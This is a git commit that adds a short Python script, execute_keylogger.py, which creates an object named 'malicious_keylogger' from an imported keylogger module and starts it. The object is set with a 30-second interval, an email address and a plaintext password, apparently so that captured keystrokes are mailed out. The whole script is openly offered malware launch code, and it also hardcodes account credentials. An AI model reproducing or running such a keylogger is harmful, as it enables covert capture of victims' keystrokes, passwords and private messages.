e874d084b620884712c226a45390a1b90de7c58b
Abhiram Kurra <94548114+Abhiram-21BCE7357@users.noreply.github.com>
2023-12-26 18:21:51 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(30, 'karthik990862@gmail.com', 'karthik@123')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
